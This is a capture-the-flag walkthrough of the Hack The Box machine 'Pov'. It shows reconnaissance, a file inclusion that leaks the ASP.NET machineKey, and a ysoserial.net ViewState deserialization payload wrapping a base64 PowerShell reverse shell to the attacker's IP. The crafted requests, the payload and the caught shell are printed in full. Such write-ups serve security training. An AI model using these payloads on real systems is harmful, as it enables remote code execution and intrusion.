![](./images/pov_banner.png)

## Reconnaissance

### Nmap

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- 10.10.11.251
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-28 10:42 UTC
Nmap scan report for 10.10.11.251
Host is up (1.3s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2078.68 seconds
```

### Enumeration of Port 80/TCP

- [http://10.10.11.251/](http://10.10.11.251/)

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://pov.htb/      
http://pov.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sfitz@pov.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.251], Microsoft-IIS[10.0], Script, Title[pov.htb], X-Powered-By[ASP.NET]
```

We added `pov.htb` to our `/etc/hosts` file.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.251    pov.htb
```

### Subdomain Enumeration with ffuf

```c
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.pov.htb" -u http://pov.htb --fs 12330

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pov.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.pov.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 12330
________________________________________________

dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 228ms]
:: Progress: [114441/114441] :: Job [1/1] :: 31 req/sec :: Duration: [0:32:46] :: Errors: 0 ::
```

We added the subdomain too.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.251    pov.htb
10.10.11.251    dev.pov.htb
```

### Investigating dev.pov.htb

- [http://dev.pov.htb/portfolio/](http://dev.pov.htb/portfolio/)

We found a download button for a `CV`. We intercepted the request with `Burp Suite` to have a closer look at it.
#### Request

```c
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 359
Origin: http://dev.pov.htb
DNT: 1
Connection: close
Referer: http://dev.pov.htb/portfolio/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=uOUN3VotXtvGvkv%2BkT53%2B0HLlX7SAC6gXyL8mDpK%2B1eXEIQZjJAtQoSaOylkYg1wrjmANYefpEnaj45JCkvr1YjukEg%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=sTzPPWn98MAWGe8PJUCIxe%2ByvaMKKhDYpQxqAl1wi8zJ8AglSPE2NkRQpXNGmBC%2FupUetN%2B3pWWoWUe6uymhy8tqv0tDVi9iqNVhOG1GHK0XiCQSIiNqVz7w1FhDYKwAtPeCPw%3D%3D&file=cv.pdf
```

## Local File Inclusion (LFI)

We figured out that changing the `cf.pdf` to for example `contact.aspx` results in getting back the page in the response.

First we enumerated the box a bit and found quite interesting files.

#### Modifed Request

```c
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 386
Origin: http://dev.pov.htb
DNT: 1
Connection: close
Referer: http://dev.pov.htb/portfolio/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=uOUN3VotXtvGvkv%2BkT53%2B0HLlX7SAC6gXyL8mDpK%2B1eXEIQZjJAtQoSaOylkYg1wrjmANYefpEnaj45JCkvr1YjukEg%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=sTzPPWn98MAWGe8PJUCIxe%2ByvaMKKhDYpQxqAl1wi8zJ8AglSPE2NkRQpXNGmBC%2FupUetN%2B3pWWoWUe6uymhy8tqv0tDVi9iqNVhOG1GHK0XiCQSIiNqVz7w1FhDYKwAtPeCPw%3D%3D&file=C:\inetpub\wwwroot\dev\web.config
```

#### Response

```c
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: application/octet-stream
Server: Microsoft-IIS/10.0
Content-Disposition: attachment; filename=C:\inetpub\wwwroot\dev\web.config
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Sun, 28 Jan 2024 11:30:32 GMT
Connection: close
Content-Length: 866

<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>

```

![](./images/lfi_request_response_config_file.png)

| Option | Value |
| ---- | ---- |
| machineKey decryption | AES |
| decryptionKey | 74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43 |
| validation | SHA1 |
| validationKey | 5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468 |

`ar0x4` pointed out that `ViewState` if probably vulnerable to `Deserialization Attacks`.

## Foothold using .Net Deserialization with ysoserial.net

We downloaded `ysoserial.net` on our `Windows` systems to use `.Net Framework` for the payload.

- [https://github.com/pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net)
- [https://book.hacktricks.xyz/pentesting-web/deserialization#ysoserial.net](https://book.hacktricks.xyz/pentesting-web/deserialization#ysoserial.net)

`xvt` provided us a working payload.

```c
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "<COMMAND_TO_EXECUTE>" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```

As payload I used `PowerShell #3 (Base64)` from `revshells.com`.

- https://www.revshells.com/

```c
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA5ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

Then we put all together to create the payload.

```c
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA5ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"  --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```

![](./images/ysoserial_payload.png)

This generated us the final payload to enter into the `ViewState` argument in the request, intercepted earlier with `Burp Suite`.

```c
E%2FMCc4y1cc9B%2FEeqmJhBae%2F4deordqEc4P%2FMSCO%2Fr3XWM8crWPyrkViKFIWpqHMPaNoHJKsHhD%2FWrZUGcDBqBuPZXe7uFx9nAqzYdX4A%2F5b%2Fz5dgK8EAzGmfzElL4CDs30Hz1dbL8uwCD9YSaTWeQUoH07WP%2BlWhhuTfqT7d8FPbEZ7%2BPfQ0o3La6f7tTiqrX0M6UNKQqQAV6lD71JH%2BhGt8PtUVJS2%2BT1WBIvzD3nlKIt7N5DqwoN76dcyGVgKgoRlrMKZbmbEmhvz4mMoxbIKnP3oQ7hS%2FtbfBkvePN8VOlDUGoY49GAPxfkIIu0QAxsee0B%2B5e9lhhsCoUPdDTAMvgfNFIZyN2hkIDw95Z7J0qYeSlO5%2BfSg0GKH4IPT4CW4Cq3Eer6DkaiPB4VLrBPGc3MyhypM8g60UYKZxiUxV5o%2BaHQrS4Y0LNUPGkitD6a8R52%2BrGFYEN8Eec5GL6KTe4O0vqY8iPytK8fWbt%2FkuZR%2BbGcDxNKhDZZILEjSOX57pihltA38znZG0lEOY4EJF0q5HxkFDak7i542sCoBvBjtvsrSpKT84prC1qU0xdiAREdyq0FKGemP5tITIFDIk7sFdt6eEM3pe0%2BGkxDScwuwO%2BCdeyQoblGKR%2FbIG%2BRrl%2BxlR6zWh7tEVzlmIpG%2Fpu6AOv85fNv3fT5xAmir5Baux5LzuSCuV9ihi42zSaQLmCWpBOBOJ7c3mEt8aixr1K2FZJHihvW83PXGqM3NOxaj5oYY2Ak6LGBnlPzz7AtroH%2Ff%2F1diE%2BZ13B%2Fzop3KTPPS463xo3l0Ox8PYV%2BypQyinhjIL39vywvXdgD0Ym6hRCuaJGu0LSJ2EFkjuRoj1tbrdPZaQcbBprLuQAcPLDfqZDr7Ua3WMssCfTEn2kMYL3fGKx9C2U78YZaVes88WSxd%2BtzGsUewTXzmRXAzCOOJWstzcxaWxwygjSIvIOf9r3MhyhZCaJrfryZ1xrnXK237PrJZh%2B34W71MLrSFVeOB4JCNcf7EKVIjuG5IKctw4pYDsg8djNGO6%2FpOaq6y%2BsDdnA1rvX9NUoC8GWGJWyfM2VVQxitZWyUG2w9mIoFXsplkD1A26ABxz1lxbMU4lZdbrFbwGNP4xFUZQ3184Apd4NgVVcSyz1pTIY2pd8GFoftu%2FkksBytMXw6s%2Fhi4svk5fhGJI08NiP6O7Xk9PhYgeg0SaHa3%2BftjYdu1ZUL2ms54CSJqo0EukeFf%2F7FEOMP7WV7YWpcBMcVBVHCXkcPAfow4600Cu3DT6GTevN64MGyGFu%2BY1bnCztCxNmk0zjtUkhV9XMRWfXCkMm0TcVOaQ%2FQ23VEWWGwrY8OkQLaS%2BcSMc4%2BNtKeHJVYprXmwRpdo9nLXhRJ48I64IyWdOOsJGG3KhQXlgm4W103q9GTyhY%2BOO3QLs%2BG8mb6UE5p0Hp720l8Erh4iDXrf%2BF2pSvJXGbwc5RvGMoAPr0B%2FodzcGzJKZB%2BPU2aPxwZr3jtZTuGed9zMLzUOtSAVqYvY6ipWZUJdl6%2Beqej%2BEiPL1hDX%2B83hril7kfo%2BQyOBxe50MghdlM9CiadgP%2FuA1o7BeaNlhJW3QsrB93iaqRt%2FbK1uusVlKdSqDOsECcmjQDCsf45RFwhCSTHLPich8QceRBrEz%2FjTwknqKh0ivKtPpZZc1sppxCwt4JDgtGpA0vWDbPnoayh8hVxeBLmo%2FNLfjudXGsFb%2Fi%2F%2BjsIe2hsxZo%2FkhLGohMZzpW%2F%2BpRChI1D3RctlGrDUhj1hRTsyrCMgA92%2BBji03m%2FY1Q8zyMrLgStpLPWmD3ZCWVyT24ssY5Td8Gn8LmkhYLdqBqpTl3ghELiwTd4AAfObJkboTYeUlSfgcmxRd3KCHyjD3MzQbkw7L%2FQqKUb0gruZis6bWobSpX8uB4Db9%2B06P%2F5F%2BfHkpLprJ9CNtpgJogupJHDPix9s9Qc5YwwEhCqPvSfectfx2uh074phxBnYgwbT0OG%2Bx31j%2Bzk3bq319FVkCaA41hju9hLujc9HbeDrnOOwn%2BvW7%2FvWyXaHcim0cJGwtOFagyZ8PDGr0Kv%2FtNdGIGEOW88xc6Djexjm4ZAPyqGNDDj11HLLzQmptjbRp7YiJEbNPHl%2FJgMuVuHfuXmWfiJdSFHNYeZPWKp2Ix%2Fds4NxMQ38uZ6tv%2BAqtZFX2fA6JZbsk41d44jggBl6VfLw912simMGo2QXZjr%2FgnQKQXHwNabVNgqLaO9H%2BdcKIf0VD2dE8ZtaeqfBwBIqTnBBoPAByJa1b9MMMkxxgYzk4ndfyS58lNRmhiPis2GECXAnptozj6xp6yXN5UWsa2lsd7Ni4txbuBTx1RgXWtlvbJjXkyQDFP0YyyKld4EtOXHC6IpkdSnE7U9JlosX59Zu6cyZcMCTX%2BRMcGIQyL3sf%2B7OLXeVqXCU6jG8g7FOoK9kVJODjPcPMddaq%2FWgjaNgVrbOvajG4zo3DqpN%2F9eWh7Vtd3p2V4pVPlzsufkhk%2BaOgZ%2FdMCuHHSwFjbCq51hYD3Ea78N2D42ftunFzpaMTrdSJ4GuUIcH%2B5E9B9wBMDyTPec%2BUOWDhFMxeBdFcRo26TALUFrkgducWXLE%2FbXFCDhoz7Gmpeqf6HhG5bxfGXO%2B%2F%2FZAh43XlZjGyuhHLYR3MOsFvQwEOmgmJ5dKCmC0JKh%2FYd4GDVbWQmKNrXgDyCf1WOdURVbItO6pF2EV1YzGb3Ls8uUt2CtX3ul6Lfmf9SbmxdNJq88WI7XichTp0%2FFUsmOlTo2EkKliRjtxUcwPo%2BjbLRXiSi9wNNU51%2BvFqAMO18obV3XZK6jUt%2FXwfwnLPqiMap%2FtSWXOydQSQw4W9DzmbyhUhAYLGVoS1V5e489b5%2BOWZLYCO3IFY6mHBi0XAcwzMBXubNPDfaagDIhoXJ%2BZ8dExEQavd5X52N%2BDOFwo9CMrPm8ndGfwXbMshsoa6yNNsKdG65%2FiB08%2FSqSsPe7aZoJxyb06j%2FZRrGPmk43iEFLb1nNoYFRcevO0u6PoCGUfUjAXYv48%2BU0C1CFXyiKHT8aqUfuLqmMr7h1hLoNu5y02vnIxMpl%2BXHAXntoM%2F6BWxBh8Bdg%3D%3D
```

![](./images/ysoserial_payload_executed.png)

### Payload Execution

We modified the initial request.

#### Request:

```c
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 359
Origin: http://dev.pov.htb
DNT: 1
Connection: close
Referer: http://dev.pov.htb/portfolio/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=uOUN3VotXtvGvkv%2BkT53%2B0HLlX7SAC6gXyL8mDpK%2B1eXEIQZjJAtQoSaOylkYg1wrjmANYefpEnaj45JCkvr1YjukEg%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=sTzPPWn98MAWGe8PJUCIxe%2ByvaMKKhDYpQxqAl1wi8zJ8AglSPE2NkRQpXNGmBC%2FupUetN%2B3pWWoWUe6uymhy8tqv0tDVi9iqNVhOG1GHK0XiCQSIiNqVz7w1FhDYKwAtPeCPw%3D%3D&file=cv.pdf
```

![](./images/request_viewstate.png)

#### Modified Request

```c
POST /portfolio/ HTTP/1.1
Host: dev.pov.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 359
Origin: http://dev.pov.htb
DNT: 1
Connection: close
Referer: http://dev.pov.htb/portfolio/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=E%2FMCc4y1cc9B%2FEeqmJhBae%2F4deordqEc4P%2FMSCO%2Fr3XWM8crWPyrkViKFIWpqHMPaNoHJKsHhD%2FWrZUGcDBqBuPZXe7uFx9nAqzYdX4A%2F5b%2Fz5dgK8EAzGmfzElL4CDs30Hz1dbL8uwCD9YSaTWeQUoH07WP%2BlWhhuTfqT7d8FPbEZ7%2BPfQ0o3La6f7tTiqrX0M6UNKQqQAV6lD71JH%2BhGt8PtUVJS2%2BT1WBIvzD3nlKIt7N5DqwoN76dcyGVgKgoRlrMKZbmbEmhvz4mMoxbIKnP3oQ7hS%2FtbfBkvePN8VOlDUGoY49GAPxfkIIu0QAxsee0B%2B5e9lhhsCoUPdDTAMvgfNFIZyN2hkIDw95Z7J0qYeSlO5%2BfSg0GKH4IPT4CW4Cq3Eer6DkaiPB4VLrBPGc3MyhypM8g60UYKZxiUxV5o%2BaHQrS4Y0LNUPGkitD6a8R52%2BrGFYEN8Eec5GL6KTe4O0vqY8iPytK8fWbt%2FkuZR%2BbGcDxNKhDZZILEjSOX57pihltA38znZG0lEOY4EJF0q5HxkFDak7i542sCoBvBjtvsrSpKT84prC1qU0xdiAREdyq0FKGemP5tITIFDIk7sFdt6eEM3pe0%2BGkxDScwuwO%2BCdeyQoblGKR%2FbIG%2BRrl%2BxlR6zWh7tEVzlmIpG%2Fpu6AOv85fNv3fT5xAmir5Baux5LzuSCuV9ihi42zSaQLmCWpBOBOJ7c3mEt8aixr1K2FZJHihvW83PXGqM3NOxaj5oYY2Ak6LGBnlPzz7AtroH%2Ff%2F1diE%2BZ13B%2Fzop3KTPPS463xo3l0Ox8PYV%2BypQyinhjIL39vywvXdgD0Ym6hRCuaJGu0LSJ2EFkjuRoj1tbrdPZaQcbBprLuQAcPLDfqZDr7Ua3WMssCfTEn2kMYL3fGKx9C2U78YZaVes88WSxd%2BtzGsUewTXzmRXAzCOOJWstzcxaWxwygjSIvIOf9r3MhyhZCaJrfryZ1xrnXK237PrJZh%2B34W71MLrSFVeOB4JCNcf7EKVIjuG5IKctw4pYDsg8djNGO6%2FpOaq6y%2BsDdnA1rvX9NUoC8GWGJWyfM2VVQxitZWyUG2w9mIoFXsplkD1A26ABxz1lxbMU4lZdbrFbwGNP4xFUZQ3184Apd4NgVVcSyz1pTIY2pd8GFoftu%2FkksBytMXw6s%2Fhi4svk5fhGJI08NiP6O7Xk9PhYgeg0SaHa3%2BftjYdu1ZUL2ms54CSJqo0EukeFf%2F7FEOMP7WV7YWpcBMcVBVHCXkcPAfow4600Cu3DT6GTevN64MGyGFu%2BY1bnCztCxNmk0zjtUkhV9XMRWfXCkMm0TcVOaQ%2FQ23VEWWGwrY8OkQLaS%2BcSMc4%2BNtKeHJVYprXmwRpdo9nLXhRJ48I64IyWdOOsJGG3KhQXlgm4W103q9GTyhY%2BOO3QLs%2BG8mb6UE5p0Hp720l8Erh4iDXrf%2BF2pSvJXGbwc5RvGMoAPr0B%2FodzcGzJKZB%2BPU2aPxwZr3jtZTuGed9zMLzUOtSAVqYvY6ipWZUJdl6%2Beqej%2BEiPL1hDX%2B83hril7kfo%2BQyOBxe50MghdlM9CiadgP%2FuA1o7BeaNlhJW3QsrB93iaqRt%2FbK1uusVlKdSqDOsECcmjQDCsf45RFwhCSTHLPich8QceRBrEz%2FjTwknqKh0ivKtPpZZc1sppxCwt4JDgtGpA0vWDbPnoayh8hVxeBLmo%2FNLfjudXGsFb%2Fi%2F%2BjsIe2hsxZo%2FkhLGohMZzpW%2F%2BpRChI1D3RctlGrDUhj1hRTsyrCMgA92%2BBji03m%2FY1Q8zyMrLgStpLPWmD3ZCWVyT24ssY5Td8Gn8LmkhYLdqBqpTl3ghELiwTd4AAfObJkboTYeUlSfgcmxRd3KCHyjD3MzQbkw7L%2FQqKUb0gruZis6bWobSpX8uB4Db9%2B06P%2F5F%2BfHkpLprJ9CNtpgJogupJHDPix9s9Qc5YwwEhCqPvSfectfx2uh074phxBnYgwbT0OG%2Bx31j%2Bzk3bq319FVkCaA41hju9hLujc9HbeDrnOOwn%2BvW7%2FvWyXaHcim0cJGwtOFagyZ8PDGr0Kv%2FtNdGIGEOW88xc6Djexjm4ZAPyqGNDDj11HLLzQmptjbRp7YiJEbNPHl%2FJgMuVuHfuXmWfiJdSFHNYeZPWKp2Ix%2Fds4NxMQ38uZ6tv%2BAqtZFX2fA6JZbsk41d44jggBl6VfLw912simMGo2QXZjr%2FgnQKQXHwNabVNgqLaO9H%2BdcKIf0VD2dE8ZtaeqfBwBIqTnBBoPAByJa1b9MMMkxxgYzk4ndfyS58lNRmhiPis2GECXAnptozj6xp6yXN5UWsa2lsd7Ni4txbuBTx1RgXWtlvbJjXkyQDFP0YyyKld4EtOXHC6IpkdSnE7U9JlosX59Zu6cyZcMCTX%2BRMcGIQyL3sf%2B7OLXeVqXCU6jG8g7FOoK9kVJODjPcPMddaq%2FWgjaNgVrbOvajG4zo3DqpN%2F9eWh7Vtd3p2V4pVPlzsufkhk%2BaOgZ%2FdMCuHHSwFjbCq51hYD3Ea78N2D42ftunFzpaMTrdSJ4GuUIcH%2B5E9B9wBMDyTPec%2BUOWDhFMxeBdFcRo26TALUFrkgducWXLE%2FbXFCDhoz7Gmpeqf6HhG5bxfGXO%2B%2F%2FZAh43XlZjGyuhHLYR3MOsFvQwEOmgmJ5dKCmC0JKh%2FYd4GDVbWQmKNrXgDyCf1WOdURVbItO6pF2EV1YzGb3Ls8uUt2CtX3ul6Lfmf9SbmxdNJq88WI7XichTp0%2FFUsmOlTo2EkKliRjtxUcwPo%2BjbLRXiSi9wNNU51%2BvFqAMO18obV3XZK6jUt%2FXwfwnLPqiMap%2FtSWXOydQSQw4W9DzmbyhUhAYLGVoS1V5e489b5%2BOWZLYCO3IFY6mHBi0XAcwzMBXubNPDfaagDIhoXJ%2BZ8dExEQavd5X52N%2BDOFwo9CMrPm8ndGfwXbMshsoa6yNNsKdG65%2FiB08%2FSqSsPe7aZoJxyb06j%2FZRrGPmk43iEFLb1nNoYFRcevO0u6PoCGUfUjAXYv48%2BU0C1CFXyiKHT8aqUfuLqmMr7h1hLoNu5y02vnIxMpl%2BXHAXntoM%2F6BWxBh8Bdg%3D%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=sTzPPWn98MAWGe8PJUCIxe%2ByvaMKKhDYpQxqAl1wi8zJ8AglSPE2NkRQpXNGmBC%2FupUetN%2B3pWWoWUe6uymhy8tqv0tDVi9iqNVhOG1GHK0XiCQSIiNqVz7w1FhDYKwAtPeCPw%3D%3D&file=cv.pdf
```

![](./images/request_viewstate_modified.png)

Which resulted in a fine `reverse shell`.

#### Response

```c
HTTP/1.1 302 Found
Cache-Control: private
Content-Type: text/html; charset=utf-8
Location: /default.aspx?aspxerrorpath=/portfolio/default.aspx
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Sun, 28 Jan 2024 11:23:24 GMT
Connection: close
Content-Length: 168

<html><head><title>Object moved</title></head><body>
<h2>Object moved to <a href="/default.aspx?aspxerrorpath=/portfolio/default.aspx">here</a>.</h2>
</body></html>

```

![](./images/request_viewstate_response.png)

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.39] from (UNKNOWN) [10.10.11.251] 49824

PS C:\windows\system32\inetsrv>
```

## Enumeration

First we checked the privileges.

```c
PS C:\windows\system32\inetsrv> whoami /all

USER INFORMATION
----------------

User Name SID                                          
========= =============================================
pov\sfitz S-1-5-21-2506154456-4081221362-271687478-1000


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                           Attributes                                        
====================================== ================ ============================================================= ==================================================
Everyone                               Well-known group S-1-1-0                                                       Mandatory group, Enabled by default, Enabled group
